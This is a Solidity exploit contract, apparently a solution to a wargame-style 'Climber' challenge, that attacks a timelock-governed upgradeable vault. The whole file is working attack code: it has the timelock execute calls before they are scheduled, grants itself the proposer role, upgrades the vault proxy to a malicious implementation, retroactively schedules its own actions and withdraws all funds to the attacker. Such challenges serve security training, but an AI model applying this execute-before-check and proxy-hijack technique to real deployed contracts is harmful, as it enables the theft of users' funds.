// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./KingVaultV2.sol";

interface IKingVault {
    function withdrawAllFunds(address payable recipient) external;
}

interface ITimelock {
    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract Exploit {
    ITimelock timelock;
    KingVaultV2 new_implementation;
    address owner;
    address proxy;

    constructor(address payable timelock_address, address _proxy) {
        timelock = ITimelock(timelock_address);
        proxy = _proxy;
        new_implementation = new KingVaultV2();
        owner = msg.sender;
    }

    function attack() external {
        attack_step1();
        // attack_step2() is called by ClimberTimelock contract
        attack_step3();
    }

    function attack_step1() public {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements) = prepare_payload();
        timelock.execute(targets, values, dataElements, 0);
    }

    function attack_step2() public {
        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements) = prepare_payload();
        timelock.schedule(targets, values, dataElements, 0);
    }

    function attack_step3() public {
        IKingVault(proxy).withdrawAllFunds(payable(owner));
    }


    // Function which prepares calls payload for ClimberTimelock executor contract.
    // The following 3 actions can be in any order as long as grantingRole action preceeds 'attack_step2()' action
    function prepare_payload() internal returns(address[] memory, uint256[] memory, bytes[] memory) {
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);

        // Force ClimberTimelock to gives us a proposer role
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));

        // Upgrade ClimberVault contract to new malicious version with unprotected sweepFunds()
        targets[1] = proxy;
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("upgradeTo(address)", address(new_implementation));

        // Once we have a Proposer Role granted, we can safely 'schedule' our actions
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("attack_step2()");

        return (targets, values, dataElements);
    }


}